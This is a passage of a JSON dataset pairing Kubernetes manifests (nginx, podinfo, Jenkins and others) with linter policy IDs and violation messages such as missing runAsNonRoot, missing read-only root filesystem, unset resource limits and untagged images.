    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  annotations:\n    cloud-space: any\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10964",
    "manifest_path": "data/manifests/the_stack_sample/sample_4205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  annotations:\n    cloud-space: any\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10965",
    "manifest_path": "data/manifests/the_stack_sample/sample_4205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  annotations:\n    cloud-space: any\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10966",
    "manifest_path": "data/manifests/the_stack_sample/sample_4205.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: nginx\n  annotations:\n    cloud-space: any\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: nginx\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      containers:\n      - name: nginx\n        image: nginx:latest\n        ports:\n        - containerPort: 8080\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10967",
    "manifest_path": "data/manifests/the_stack_sample/sample_4206.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: demo-service\nspec:\n  ports:\n  - port: 80\n    protocol: TCP\n    targetPort: 8888\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "10968",
    "manifest_path": "data/manifests/the_stack_sample/sample_4209.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - mountPath: /var/lib/www/html\n      name: csi-data-opensdsplugin\n  volumes:\n  - name: csi-data-opensdsplugin\n    persistentVolumeClaim:\n      claimName: opensdspvc\n      readOnly: false\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10969",
    "manifest_path": "data/manifests/the_stack_sample/sample_4209.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - mountPath: /var/lib/www/html\n      name: csi-data-opensdsplugin\n  volumes:\n  - name: csi-data-opensdsplugin\n    persistentVolumeClaim:\n      claimName: opensdspvc\n      readOnly: false\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10970",
    "manifest_path": "data/manifests/the_stack_sample/sample_4209.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - mountPath: /var/lib/www/html\n      name: csi-data-opensdsplugin\n  volumes:\n  - name: csi-data-opensdsplugin\n    persistentVolumeClaim:\n      claimName: opensdspvc\n      readOnly: false\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10971",
    "manifest_path": "data/manifests/the_stack_sample/sample_4209.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - mountPath: /var/lib/www/html\n      name: csi-data-opensdsplugin\n  volumes:\n  - name: csi-data-opensdsplugin\n    persistentVolumeClaim:\n      claimName: opensdspvc\n      readOnly: false\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10972",
    "manifest_path": "data/manifests/the_stack_sample/sample_4209.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\nspec:\n  containers:\n  - image: nginx\n    imagePullPolicy: IfNotPresent\n    name: nginx\n    ports:\n    - containerPort: 80\n      protocol: TCP\n    volumeMounts:\n    - mountPath: /var/lib/www/html\n      name: csi-data-opensdsplugin\n  volumes:\n  - name: csi-data-opensdsplugin\n    persistentVolumeClaim:\n      claimName: opensdspvc\n      readOnly: false\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10973",
    "manifest_path": "data/manifests/the_stack_sample/sample_4210.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: bungeecord\nspec:\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "10974",
    "manifest_path": "data/manifests/the_stack_sample/sample_4212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.9\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "10975",
    "manifest_path": "data/manifests/the_stack_sample/sample_4212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.9\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"podinfod\" does not have a read-only root file system"
  },
  {
    "id": "10976",
    "manifest_path": "data/manifests/the_stack_sample/sample_4212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.9\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init\" is not set to runAsNonRoot"
  },
  {
    "id": "10977",
    "manifest_path": "data/manifests/the_stack_sample/sample_4212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.9\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"podinfod\" is not set to runAsNonRoot"
  },
  {
    "id": "10978",
    "manifest_path": "data/manifests/the_stack_sample/sample_4212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.9\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init\" has cpu request 0"
  },
  {
    "id": "10979",
    "manifest_path": "data/manifests/the_stack_sample/sample_4212.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: podinfo\n  namespace: demo\n  labels:\n    app: podinfo\nspec:\n  selector:\n    matchLabels:\n      app: podinfo\n  template:\n    metadata:\n      annotations:\n        prometheus.io/scrape: 'true'\n      labels:\n        app: podinfo\n    spec:\n      initContainers:\n      - name: init\n        image: alpine:3.9\n        command:\n        - sleep\n        - '1'\n      containers:\n      - name: podinfod\n        image: stefanprodan/podinfo:1.3.2\n        imagePullPolicy: IfNotPresent\n        ports:\n        - containerPort: 9898\n          name: http\n          protocol: TCP\n        command:\n        - ./podinfo\n        - --port=9898\n        - --level=info\n        - --random-delay=false\n        - --random-error=false\n        env:\n        - name: PODINFO_UI_COLOR\n          value: green\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 9898\n        readinessProbe:\n          httpGet:\n            path: /readyz\n            port: 9898\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 128Mi\n          requests:\n            cpu: 100m\n            memory: 64Mi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"init\" has memory limit 0"
  },
  {
    "id": "10980",
    "manifest_path": "data/manifests/the_stack_sample/sample_4213.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-495\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10981",
    "manifest_path": "data/manifests/the_stack_sample/sample_4213.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-495\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "10982",
    "manifest_path": "data/manifests/the_stack_sample/sample_4213.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-495\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "10983",
    "manifest_path": "data/manifests/the_stack_sample/sample_4213.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-495\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "10984",
    "manifest_path": "data/manifests/the_stack_sample/sample_4213.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-495\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "10985",
    "manifest_path": "data/manifests/the_stack_sample/sample_4214.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: website\n  labels:\n    app: website\n    role: frontend\nspec:\n  containers:\n  - name: website\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"website\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10986",
    "manifest_path": "data/manifests/the_stack_sample/sample_4214.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: website\n  labels:\n    app: website\n    role: frontend\nspec:\n  containers:\n  - name: website\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"website\" does not have a read-only root file system"
  },
  {
    "id": "10987",
    "manifest_path": "data/manifests/the_stack_sample/sample_4214.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: website\n  labels:\n    app: website\n    role: frontend\nspec:\n  containers:\n  - name: website\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"website\" is not set to runAsNonRoot"
  },
  {
    "id": "10988",
    "manifest_path": "data/manifests/the_stack_sample/sample_4214.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: website\n  labels:\n    app: website\n    role: frontend\nspec:\n  containers:\n  - name: website\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"website\" has cpu request 0"
  },
  {
    "id": "10989",
    "manifest_path": "data/manifests/the_stack_sample/sample_4214.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: website\n  labels:\n    app: website\n    role: frontend\nspec:\n  containers:\n  - name: website\n    image: nginx\n    ports:\n    - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"website\" has memory limit 0"
  },
  {
    "id": "10990",
    "manifest_path": "data/manifests/the_stack_sample/sample_4215.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: jenkins\n  namespace: jx-jenkins\n  labels:\n    app.kubernetes.io/name: jenkins\n    helm.sh/chart: jenkins-3.4.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: jenkins\n    app.kubernetes.io/component: jenkins-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: jenkins-controller\n      app.kubernetes.io/instance: jenkins\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jenkins\n        app.kubernetes.io/managed-by: Helm\n        app.kubernetes.io/instance: jenkins\n        app.kubernetes.io/component: jenkins-controller\n      annotations:\n        checksum/config: 5502910095a90d9316a107aa85c959f539c7fd83343359a9244d00fb6f1df25a\n    spec:\n      securityContext:\n        runAsUser: 1000\n        fsGroup: 1000\n        runAsNonRoot: true\n      serviceAccountName: jenkins\n      initContainers:\n      - name: init\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        command:\n        - sh\n        - /var/jenkins_config/apply_config.sh\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n        - mountPath: /usr/share/jenkins/ref/plugins\n          name: plugins\n        - mountPath: /var/jenkins_plugins\n          name: plugin-dir\n      containers:\n      - name: jenkins\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        args:\n        - --httpPort=8080\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: JAVA_OPTS\n          value: '-Dcasc.reload.token=$(POD_NAME) '\n        - name: JENKINS_OPTS\n          value: ''\n        - name: JENKINS_SLAVE_AGENT_PORT\n          value: '50000'\n        - name: CASC_JENKINS_CONFIG\n          value: /var/jenkins_home/casc_configs\n        ports:\n        - containerPort: 8080\n          name: http\n        - containerPort: 50000\n          name: agent-listener\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        startupProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n          readOnly: false\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n          readOnly: true\n        - mountPath: /usr/share/jenkins/ref/plugins/\n          name: plugin-dir\n          readOnly: false\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-username\n          subPath: jenkins-admin-user\n          readOnly: true\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-password\n          subPath: jenkins-admin-password\n          readOnly: true\n      - name: config-reload\n        image: kiwigrid/k8s-sidecar:1.12.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: LABEL\n          value: jenkins-jenkins-config\n        - name: FOLDER\n          value: /var/jenkins_home/casc_configs\n        - name: NAMESPACE\n          value: jx-jenkins\n        - name: REQ_URL\n          value: http://localhost:8080/reload-configuration-as-code/?casc-reload-token=$(POD_NAME)\n        - name: REQ_METHOD\n          value: POST\n        - name: REQ_RETRY_CONNECT\n          value: '10'\n        resources: {}\n        volumeMounts:\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: jenkins-home\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: plugins\n        emptyDir: {}\n      - name: jenkins-config\n        configMap:\n          name: jenkins\n      - name: plugin-dir\n        emptyDir: {}\n      - name: jenkins-home\n        persistentVolumeClaim:\n          claimName: jenkins\n      - name: sc-config-volume\n        emptyDir: {}\n      - name: admin-secret\n        secret:\n          secretName: jenkins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"config-reload\" does not have a read-only root file system"
  },
  {
    "id": "10991",
    "manifest_path": "data/manifests/the_stack_sample/sample_4215.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: jenkins\n  namespace: jx-jenkins\n  labels:\n    app.kubernetes.io/name: jenkins\n    helm.sh/chart: jenkins-3.4.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: jenkins\n    app.kubernetes.io/component: jenkins-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: jenkins-controller\n      app.kubernetes.io/instance: jenkins\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jenkins\n        app.kubernetes.io/managed-by: Helm\n        app.kubernetes.io/instance: jenkins\n        app.kubernetes.io/component: jenkins-controller\n      annotations:\n        checksum/config: 5502910095a90d9316a107aa85c959f539c7fd83343359a9244d00fb6f1df25a\n    spec:\n      securityContext:\n        runAsUser: 1000\n        fsGroup: 1000\n        runAsNonRoot: true\n      serviceAccountName: jenkins\n      initContainers:\n      - name: init\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        command:\n        - sh\n        - /var/jenkins_config/apply_config.sh\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n        - mountPath: /usr/share/jenkins/ref/plugins\n          name: plugins\n        - mountPath: /var/jenkins_plugins\n          name: plugin-dir\n      containers:\n      - name: jenkins\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        args:\n        - --httpPort=8080\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: JAVA_OPTS\n          value: '-Dcasc.reload.token=$(POD_NAME) '\n        - name: JENKINS_OPTS\n          value: ''\n        - name: JENKINS_SLAVE_AGENT_PORT\n          value: '50000'\n        - name: CASC_JENKINS_CONFIG\n          value: /var/jenkins_home/casc_configs\n        ports:\n        - containerPort: 8080\n          name: http\n        - containerPort: 50000\n          name: agent-listener\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        startupProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n          readOnly: false\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n          readOnly: true\n        - mountPath: /usr/share/jenkins/ref/plugins/\n          name: plugin-dir\n          readOnly: false\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-username\n          subPath: jenkins-admin-user\n          readOnly: true\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-password\n          subPath: jenkins-admin-password\n          readOnly: true\n      - name: config-reload\n        image: kiwigrid/k8s-sidecar:1.12.2\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: LABEL\n          value: jenkins-jenkins-config\n        - name: FOLDER\n          value: /var/jenkins_home/casc_configs\n        - name: NAMESPACE\n          value: jx-jenkins\n        - name: REQ_URL\n          value: http://localhost:8080/reload-configuration-as-code/?casc-reload-token=$(POD_NAME)\n        - name: REQ_METHOD\n          value: POST\n        - name: REQ_RETRY_CONNECT\n          value: '10'\n        resources: {}\n        volumeMounts:\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: jenkins-home\n          mountPath: /var/jenkins_home\n      volumes:\n      - name: plugins\n        emptyDir: {}\n      - name: jenkins-config\n        configMap:\n          name: jenkins\n      - name: plugin-dir\n        emptyDir: {}\n      - name: jenkins-home\n        persistentVolumeClaim:\n          claimName: jenkins\n      - name: sc-config-volume\n        emptyDir: {}\n      - name: admin-secret\n        secret:\n          secretName: jenkins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init\" does not have a read-only root file system"
  },
  {
    "id": "10992",
    "manifest_path": "data/manifests/the_stack_sample/sample_4215.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: jenkins\n  namespace: jx-jenkins\n  labels:\n    app.kubernetes.io/name: jenkins\n    helm.sh/chart: jenkins-3.4.1\n    app.kubernetes.io/managed-by: Helm\n    app.kubernetes.io/instance: jenkins\n    app.kubernetes.io/component: jenkins-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: jenkins\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: jenkins-controller\n      app.kubernetes.io/instance: jenkins\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: jenkins\n        app.kubernetes.io/managed-by: Helm\n        app.kubernetes.io/instance: jenkins\n        app.kubernetes.io/component: jenkins-controller\n      annotations:\n        checksum/config: 5502910095a90d9316a107aa85c959f539c7fd83343359a9244d00fb6f1df25a\n    spec:\n      securityContext:\n        runAsUser: 1000\n        fsGroup: 1000\n        runAsNonRoot: true\n      serviceAccountName: jenkins\n      initContainers:\n      - name: init\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        command:\n        - sh\n        - /var/jenkins_config/apply_config.sh\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n        - mountPath: /usr/share/jenkins/ref/plugins\n          name: plugins\n        - mountPath: /var/jenkins_plugins\n          name: plugin-dir\n      containers:\n      - name: jenkins\n        image: jenkins/jenkins:2.289.1-jdk11\n        imagePullPolicy: Always\n        args:\n        - --httpPort=8080\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: JAVA_OPTS\n          value: '-Dcasc.reload.token=$(POD_NAME) '\n        - name: JENKINS_OPTS\n          value: ''\n        - name: JENKINS_SLAVE_AGENT_PORT\n          value: '50000'\n        - name: CASC_JENKINS_CONFIG\n          value: /var/jenkins_home/casc_configs\n        ports:\n        - containerPort: 8080\n          name: http\n        - containerPort: 50000\n          name: agent-listener\n        livenessProbe:\n          failureThreshold: 5\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        readinessProbe:\n          failureThreshold: 3\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        startupProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /login\n            port: http\n          periodSeconds: 10\n          timeoutSeconds: 5\n        resources:\n          limits:\n            cpu: 2000m\n            memory: 4096Mi\n          requests:\n            cpu: 50m\n            memory: 256Mi\n        volumeMounts:\n        - mountPath: /var/jenkins_home\n          name: jenkins-home\n          readOnly: false\n        - mountPath: /var/jenkins_config\n          name: jenkins-config\n          readOnly: true\n        - mountPath: /usr/share/jenkins/ref/plugins/\n          name: plugin-dir\n          readOnly: false\n        - name: sc-config-volume\n          mountPath: /var/jenkins_home/casc_configs\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-username\n          subPath: jenkins-admin-user\n          readOnly: true\n        - name: admin-secret\n          mountPath: /run/secrets/chart-admin-password\n          subPath: jenkins-admin-password\n          readOnly: true\n      - name: 